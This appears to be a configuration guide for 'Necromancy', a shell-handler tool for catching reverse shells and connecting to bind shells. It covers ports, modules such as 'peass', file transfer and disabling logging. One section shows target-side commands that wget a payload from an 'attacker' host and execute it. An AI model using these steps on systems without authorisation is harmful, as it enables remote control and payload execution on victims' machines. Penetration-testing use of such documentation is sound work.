# ⚙️ Necromancy Configuration Examples

## 📝 Basic Configuration

### Command Line Configuration
```bash
# Basic listener setup
./necromancy -p 4444

# Multi-port listener
./necromancy -p 4444,4445,4446

# With HTTP file server
./necromancy -p 4444 -s /tmp/files -w 8000

# Connect to bind shell
./necromancy -c target.com -p 4444

# Session persistence
./necromancy -p 4444 -m 3
```

### Environment Variables
```bash
# Set default ports
export NECROMANCY_PORTS="4444,4445,4446"

# Set default interface
export NECROMANCY_INTERFACE="0.0.0.0"

# Disable auto-upgrade
export NECROMANCY_NO_UPGRADE="true"

# Disable logging
export NECROMANCY_NO_LOG="true"
```

## 🚀 Advanced Usage Examples

### Multi-Target Setup
```bash
# Listen on multiple interfaces
./necromancy -p 4444 -i 0.0.0.0
./necromancy -p 4445 -i 192.168.1.100
./necromancy -p 4446 -i 10.0.0.1
```

### Session Management
```bash
# Start with session persistence
./necromancy -p 4444 -m 5

# Connect to multiple bind shells
./necromancy -c target1.com -p 4444 &
./necromancy -c target2.com -p 4445 &
./necromancy -c target3.com -p 4446 &
```

### File Transfer Setup
```bash
# HTTP file server for transfers
./necromancy -p 4444 -s /home/user/payloads -w 8080

# On target: wget http://attacker:8080/payload.sh
# On target: chmod +x payload.sh && ./payload.sh
```

## 🛠️ Module Configuration

### Custom Module Directory
```bash
# Create custom modules directory
mkdir -p ~/.necromancy/modules

# Add custom module
cat > ~/.necromancy/modules/custom_scan.sh << 'EOF'
#!/bin/bash
echo "Running custom network scan..."
nmap -sS -O $1
EOF

chmod +x ~/.necromancy/modules/custom_scan.sh
```

### Module Execution
```bash
# List available modules
> m

# Execute specific module
> m peass

# Execute with parameters (if supported)
> m custom_scan 192.168.1.0/24
```

## 📁 File Manager Configuration

### Custom File Manager Settings
```bash
# Set default editor
export NECROMANCY_EDITOR="nano"

# Set file manager colors
export NECROMANCY_FM_COLORS="true"

# Set default file permissions
export NECROMANCY_FILE_MODE="644"
export NECROMANCY_DIR_MODE="755"
```

### File Manager Shortcuts
```
Navigation:
  ↑/↓ - Navigate files
  Enter - Open/execute
  Backspace - Parent directory
  
Operations:
  r - Refresh
  d - Download
  u - Upload
  x - Delete
  n - New file
  m - New directory
  e - Edit
  c - Copy
  v - Paste
  a - Select all
  
System:
  q - Quit
  h - Help
  F12 - Detach
```

## 🔧 Network Configuration

### Interface Selection
```bash
# List available interfaces
./necromancy -l

# Bind to specific interface
./necromancy -p 4444 -i eth0
./necromancy -p 4445 -i wlan0
```

### Port Configuration
```bash
# Single port
./necromancy -p 4444

# Multiple ports
./necromancy -p 4444,4445,4446

# Port range (if supported by OS)
./necromancy -p 4444-4450
```

## 🛡️ Security Configuration

### Secure Operation
```bash
# Disable logging for sensitive operations
./necromancy -p 4444 -L

# Disable shell upgrade (basic shells only)
./necromancy -p 4444 -U

# Use non-standard ports
./necromancy -p 31337,1337,8080
```

### Session Security
```bash
# Limit concurrent sessions
./necromancy -p 4444 -m 5

# Use isolated network interface
./necromancy -p 4444 -i 192.168.1.100

# Enable session timeout (if implemented)
export NECROMANCY_SESSION_TIMEOUT="3600"
```

## 🐛 Troubleshooting Configuration

### Debug Mode
```bash
# Enable debug logging
export NECROMANCY_DEBUG="true"

# Verbose output
export NECROMANCY_VERBOSE="true"

# Log to specific file
export NECROMANCY_LOG_FILE="/tmp/necromancy.log"
```

### Common Issues

**Port binding issues:**
```bash
# Check if port is in use
netstat -tulpn | grep 4444

# Use different port
./necromancy -p 4445
```

**Permission issues:**
```bash
# Check file permissions
ls -la necromancy

# Fix permissions
chmod +x necromancy
```

**Network issues:**
```bash
# Test connectivity
ping target.com

# Check firewall
sudo iptables -L

# Test with netcat
nc -lvp 4444
```

## 📊 Performance Tuning

### Resource Optimization
```bash
# Limit memory usage
export NECROMANCY_MAX_MEMORY="512M"

# Limit concurrent connections
export NECROMANCY_MAX_CONNECTIONS="100"

# Optimize for high-latency networks
export NECROMANCY_TCP_NODELAY="true"
```

### Logging Configuration
```bash
# Rotate logs
export NECROMANCY_LOG_ROTATE="true"
export NECROMANCY_LOG_MAX_SIZE="10M"
export NECROMANCY_LOG_MAX_FILES="10"

# Log levels
export NECROMANCY_LOG_LEVEL="info"  # debug, info, warn, error
```

---

**Configuration Examples** - Customize Necromancy for your specific needs